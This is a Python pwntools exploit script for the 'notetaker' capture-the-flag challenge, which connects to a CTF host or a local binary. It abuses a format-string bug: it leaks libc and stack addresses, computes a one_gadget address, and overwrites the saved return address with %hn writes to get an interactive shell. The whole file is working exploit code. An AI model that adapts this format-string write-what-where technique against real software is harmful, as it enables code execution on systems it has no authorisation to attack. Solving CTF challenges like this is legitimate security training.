#!/usr/bin/env python3

from pwn import *

context.terminal = ["foot", "-e", "sh", "-c"]

exe = ELF('notetaker_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

info = lambda msg: log.info(msg)
s = lambda data, proc=None: proc.send(data) if proc else p.send(data)
sa = lambda msg, data, proc=None: proc.sendafter(msg, data) if proc else p.sendafter(msg, data)
sl = lambda data, proc=None: proc.sendline(data) if proc else p.sendline(data)
sla = lambda msg, data, proc=None: proc.sendlineafter(msg, data) if proc else p.sendlineafter(msg, data)
sn = lambda num, proc=None: proc.send(str(num).encode()) if proc else p.send(str(num).encode())
sna = lambda msg, num, proc=None: proc.sendafter(msg, str(num).encode()) if proc else p.sendafter(msg, str(num).encode())
sln = lambda num, proc=None: proc.sendline(str(num).encode()) if proc else p.sendline(str(num).encode())
slna = lambda msg, num, proc=None: proc.sendlineafter(msg, str(num).encode()) if proc else p.sendlineafter(msg, str(num).encode())
def GDB():
    if not args.REMOTE:
        gdb.attach(p, gdbscript='''
        b*main+228

        c
        ''')
        sleep(1)


if args.REMOTE:
    p = remote('notetaker.ctf.pascalctf.it', 9002)
else:
    p = process([exe.path])
GDB()


sla(b'> ', b'2')
sla(b'Enter the note: ', b'%43$p%40$p')

sla(b'> ', b'1')

leak = p.recvline()[:-1].split(b'0x')                                                                            

libc_leak = int(leak[1], 16)
stack_leak = int(leak[2], 16)
libc.address = libc_leak - 0x20840
info("libc leak: " + hex(libc_leak))
info("libc base: " + hex(libc.address))
info("stack leak: " + hex(stack_leak))

rip = stack_leak - 0xd8

one = 0xf1247 + libc.address

package = {
    (one >> 0 ) & 0xffff : rip,
    (one >> 16 ) & 0xffff : rip + 2,
    (one >> 32 ) & 0xffff : rip + 4,

}

order = sorted(package)

load = flat(
    f'%{order[0]}c%14$hn',
    f'%{order[1] - order[0]}c%15$hn',
    f'%{order[2] - order[1]}c%16$hn',

)   

load = load.ljust(0x30, b'A')

load += flat(
    package[order[0]],
    package[order[1]],
    package[order[2]]

)

sla(b'> ', b'2')
sla(b'Enter the note: ', load)

sla(b'> ', b'1')
sla(b'> ', b'5')



p.interactive()
